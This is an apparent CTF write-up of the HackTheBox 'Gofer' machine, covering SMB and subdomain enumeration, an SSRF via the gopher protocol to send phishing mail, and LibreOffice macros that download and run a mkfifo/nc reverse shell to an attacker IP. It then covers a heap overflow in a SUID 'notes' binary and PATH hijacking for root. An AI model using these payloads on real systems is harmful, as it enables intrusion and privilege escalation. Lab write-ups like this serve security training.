---
layout: post
title: Gofer - Hard - Linux
date: 29-07-2023
categories: [CTF - HackTheBox]
tag: [SMB, gopher, SSRF, SMTP, Binary Exploitation, LibreOffice, Macros]
---

# Nmap scan
Results show a web server and SMB service. There is also a filtered port on 25 which typically is used for mail services.

```
# Nmap 7.93 scan initiated Sat Jul 29 20:17:22 2023 as: nmap -sC -sV -p- -oA nmap/gopher-allports -v 10.129.143.7                                                               
Nmap scan report for 10.129.143.7                                                                                                                                               
Host is up (0.046s latency).
Not shown: 65530 closed tcp ports (reset)
PORT    STATE    SERVICE     VERSION
22/tcp  open     ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 aa25826eb804b6a9a95e1a91f09451dd (RSA)
|   256 1821baa7dce44f60d781039a5dc2e596 (ECDSA)
|_  256 a42d0d45132a9e7f867af6f778bc42d9 (ED25519)
25/tcp  filtered smtp
80/tcp  open     http        Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 (Debian) 
|_http-title: Did not follow redirect to http://gofer.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS 
139/tcp open     netbios-ssn Samba smbd 4.6.2
445/tcp open     netbios-ssn Samba smbd 4.6.2
Service Info: Host: gofer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: GOFER, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   GOFER<00>            Flags: <unique><active>
|   GOFER<03>            Flags: <unique><active>
|   GOFER<20>            Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb2-time: 
|   date: 2023-07-29T19:17:50
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 29 20:17:50 2023 -- 1 IP address (1 host up) scanned in 28.63 seconds

```
# Enumerating SMB share
It was possible to connect to the SMB share using anonymous authentication.

```
┌─[parrot@parrot]─[~/hackthebox/gopher]
└──╼ $smbclient -L //gofer.htb
Password for [WORKGROUP\parrot]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shares          Disk      
        IPC$            IPC       IPC Service (Samba 4.13.13-Debian)
SMB1 disabled -- no workgroup available

```

The share contained a text file with the below contents of an email sent to staff members. The email strongly suggests two things. The first is that the path to RCE will be done via sending a malicious office document. The second being there is a web server in place which means the next step should be subdomain enumeration.

```
From jdavis@gofer.htb  Fri Oct 28 20:29:30 2022
Return-Path: <jdavis@gofer.htb>
X-Original-To: tbuckley@gofer.htb
Delivered-To: tbuckley@gofer.htb
Received: from gofer.htb (localhost [127.0.0.1])
        by gofer.htb (Postfix) with SMTP id C8F7461827
        for <tbuckley@gofer.htb>; Fri, 28 Oct 2022 20:28:43 +0100 (BST)
Subject:Important to read!
Message-Id: <20221028192857.C8F7461827@gofer.htb>
Date: Fri, 28 Oct 2022 20:28:43 +0100 (BST)
From: jdavis@gofer.htb

Hello guys,

Our dear Jocelyn received another phishing attempt last week and his habit of clicking on links without paying much attention may be problematic one day. That's why from now on, I've decided that important documents will only be sent internally, by mail, which should greatly limit the risks. If possible, use an .odt format, as documents saved in Office Word are not always well interpreted by Libreoffice.

PS: Last thing for Tom; I know you're working on our web proxy but if you could restrict access, it will be more secure until you have finished it. It seems to me that it should be possible to do so via <Limit>
```

# Enumerating web proxy
Gobuster failed on this box due to it returning true on all requests. wfuzz was used instead by fuzzing the host header in the HTTP request as shown below. A proxy subdomain was discovered.

```
┌─[parrot@parrot]─[~/hackthebox/gopher]                                                                                                                                         
└──╼ $wfuzz -H 'Host: FUZZ.gofer.htb' -u http://gofer.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hc 301                                        
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's d
ocumentation for more information.                                                                                                                                              
********************************************************                                                                                                                        
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://gofer.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                         
=====================================================================

000000084:   401        14 L     54 W       462 Ch      "proxy"
```

This step took much longer than it should have. After figuring out that the OPTIONS method could be used to enumerate valid pages it was possible to find the way forward.

```
┌─[parrot@parrot]─[~/hackthebox/gopher]
└──╼ $curl -v -XOPTIONS http://proxy.gofer.htb/index.html
*   Trying 10.129.143.86:80...
* Connected to proxy.gofer.htb (10.129.143.86) port 80 (#0)
> OPTIONS /index.html HTTP/1.1
> Host: proxy.gofer.htb
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Mon, 31 Jul 2023 06:09:47 GMT
< Server: Apache/2.4.56 (Debian)
< Allow: HEAD,GET,POST,OPTIONS
< Content-Length: 0
< Content-Type: text/html
< 
* Connection #0 to host proxy.gofer.htb left intact
┌─[parrot@parrot]─[~/hackthebox/gopher]
└──╼ $curl -v -XOPTIONS http://proxy.gofer.htb/index.php
*   Trying 10.129.143.86:80...
* Connected to proxy.gofer.htb (10.129.143.86) port 80 (#0)
> OPTIONS /index.php HTTP/1.1
> Host: proxy.gofer.htb
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Mon, 31 Jul 2023 06:09:58 GMT
< Server: Apache/2.4.56 (Debian)
< Vary: Accept-Encoding
< Content-Length: 81
< Content-Type: text/html; charset=UTF-8
< 
<!-- Welcome to Gofer proxy -->
* Connection #0 to host proxy.gofer.htb left intact
<html><body>Missing URL parameter !</body></html>
```

# Sending Mail via SSRF with gopher protocol

With the collection of hints and information gathered in addition to the name of the box, its clear the way forward will involve sending a mail with a malicious attachment/link. If the attachment was included in the URL some how it would be quite large.

It turned out there was logic to simulate clicking links and downloading files which was ideal. Next steps will involve creating a malicious office document, hosting it on a server, using the PHP discovered in the previous step to take advantage of SSRF using the gopher protocol to send a mail.

This process was well documented on hacktricks so it was used as a resource for this step.

### Plaintext payload to send email via SMTP (Port 25)
```
gopher://2130706433:25/xHELO gofer.htb
MAIL FROM:<hacker@site.com>
RCPT TO:<jhudson@gofer.htb>
DATA
From: [Hacker] <hacker@site.com>
To: <jhudson@gofer.htb>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: AH AH AH

You didn't say the magic word ! <a+href='http://10.10.14.139/bad.odt>this</a>
.
QUIT
```

### Double URL encoded payload
```
gopher://2130706433:25/xHELO%20gofer.htb%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cjhudson@gofer.htb%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cjhudson@gofer.htb%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%20<a+href%3d'http%3a//10.10.14.139/bad.odt>this</a>%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 
```

### Final payload sent via SSRF 

`gopher://2130706433:25/` translates into 127.0.0.1:25 to bypass any blacklists. 

```
curl -v -XOPTIONS "http://proxy.gofer.htb/index.php?url=gopher://2130706433:25/xHELO%20gofer.htb%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cjhudson@gofer.htb%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cjhudson@gofer.htb%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%20<a+href%3d'http%3a//10.10.14.139/bad.odt>this</a>%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a"
```

# LibreOffice payload
Below is a copy of the payload used to gain RCE. There was a blacklist preventing certain commands from executing. Breaking the command up into two parts worked as shown below. First request downloads and saves the payload on disk. The second request executes it. 

### Payload 1 - Sent first
```vb
Sub Main
	Shell("curl 10.10.14.139/shell -o /tmp/shell")
End Sub
```

### Payload 2 - Sent second
```vb
Sub Main
	Shell("/bin/sh /tmp/shell")
End Sub
```

### Contents of "shell"
```bash
#!/bin/bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.139 9001 >/tmp/f
```

# Reverse shell returned
```
```
# Script - linpeas.sh results

Below is a list of the interesting finds linpeas.sh discovered. Unfortunately it was not possible to crack the hash. The `notes` binary seems relevant to the box but the current user could not read/execute it. The `tcpdump` binary could be interesting but was not used to solve the box.

```
tbuckley:$apr1$YcZb9OIz$fRzQMx20VskXgmH65jjLh/
/usr/local/bin/notes (Unknown SUID binary!)
/usr/bin/tcpdump cap_net_admin,cap_net_raw=eip
```
# pspy64 results

To proceed it seemed necessary to access a user account which had access to the `notes` binary. After running pspy64 to check the processes there was an automated script automatically logging into the web proxy. The username and password were visible in the parameters.  This password was valid and allowed a user switch to `tbuckley`

```
/usr/bin/curl http://proxy.gofer.htb/?url=http://gofer.htb --user tbuckley:ooP4dietie3o_h*****
```

# Reversing the notes binary
The user `tbuckley` had access to read and execute the binary. Upon execution it give a number of various options shown below.

```
tbuckley@gofer:~$ /usr/local/bin/notes                                                                                                                                        
========================================                                                                                                                                        
1) Create an user and choose an username                                                                                                                                        
2) Show user information                                                                                                                                                        
3) Delete an user                                                                                                                                                               
4) Write a note                                                                                                                                                                 
5) Show a note                                                                                                                                                                  
6) Save a note (not yet implemented)                                                                                                                                            
7) Delete a note                                                                                                                                                                
8) Backup notes                                                                                                                                                                 
9) Quit                                                                                                                                                                         
========================================
```

Opening the binary in Ghidra revealed the logic of the binary. After spending time reviewing the logic and discussing the issue with others it seemed possible to overflow into the admin role variable. Once the admin role had been set it will satisfy the requirements of the string compare function which will unlock case 8.

Once the logic to case 8 is unlocked the curl request can be exploited by modifying the environment path to execute a malicious file with root privileges.

```c
void main(void)

{
  __uid_t _Var1;
  int iVar2;
  undefined4 case_select;
  void *note;
  void *username;
  
  case_select = 0;
  username = (void *)0x0;
  note = (void *)0x0;
  do {
    puts(
        "========================================\n1) Create an user and choose an username\n2) Show  user information\n3) Delete an user\n4) Write a note\n5) Show a note\n6) Save a note (not y et implemented)\n7) Delete a note\n8) Backup notes\n9) Quit\n=============================== =========\n\n"
        );
    printf("Your choice: ");
    __isoc99_scanf(&DAT_0010212b,&case_select);
    puts("");
    switch(case_select) {
    default:
                    /* WARNING: Subroutine does not return */
      exit(0);
    case 1:
      username = malloc(0x28);
      if (username == (void *)0x0) {
                    /* WARNING: Subroutine does not return */
        exit(-1);
      }
      memset(username,0,0x18);
      memset((void *)((long)username + 0x18),0,0x10);
      _Var1 = getuid();
      if (_Var1 == 0) {
        *(undefined4 *)((long)username + 0x18) = 0x696d6461;
        *(undefined *)((long)username + 0x1c) = 0x6e;
      }
      else {
        *(undefined4 *)((long)username + 0x18) = 0x72657375;
      }
      printf("Choose an username: ");
      __isoc99_scanf(&DAT_00102144,username);
      puts("");
      break;
    case 2:
      if (username == (void *)0x0) {
        puts("First create an user!\n");
      }
      else {
        printf("\nUsername: %s\n",username);
        printf("Role: %s\n\n",(long)username + 0x18);
      }
      break;
    case 3:
      if (username != (void *)0x0) {
        free(username);
      }
      break;
    case 4:
      note = malloc(0x28);
      memset(note,0,0x28);
      if (note == (void *)0x0) {
                    /* WARNING: Subroutine does not return */
        exit(-1);
      }
      puts("Write your note:");
      __isoc99_scanf(&DAT_0010218b,note);
      break;
    case 5:
      printf("Note: %s\n\n",note);
      break;
    case 6:
      puts("Coming soon!\n");
      break;
    case 7:
      if (note != (void *)0x0) {
        free(note);
        note = (void *)0x0;
      }
      break;
    case 8:
      if (username == (void *)0x0) {
        puts("First create an user!\n");
      }
      else {
        iVar2 = strcmp((char *)((long)username + 0x18),"admin");
        if (iVar2 == 0) {
          puts("Access granted!");
          setuid(0);
          setgid(0);
          system("tar -czvf /root/backups/backup_notes.tar.gz /opt/notes");
        }
        else {
          puts("Access denied: you don\'t have the admin role!\n");
        }
      }
    }
  } while( true );
}
```

# Overflow sequence
```
OPTION 1:  INPUT: aaaaaaaaaaaaaaaaaaaaaaaaadmin
OPTION 3:  INPUT: NULL
OPTION 4:  INPUT: aaaaaaaaaaaaaaaaaaaaaaaaadmin
OPTION 8:  Access granted!
```

# Hijacking the curl command
```
echo "cat /root/root.txt" > tar
chmod +x tar
```
```
export PATH=/home/tbuckley:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```
```
tbuckley@gofer:~$ which tar                                                                                                                                                  
/home/tbuckley/tar
```
# Root flag 
```
========================================


Your choice: 8

Access granted!
c487730d010f0b879047330b64e6089f
========================================

```
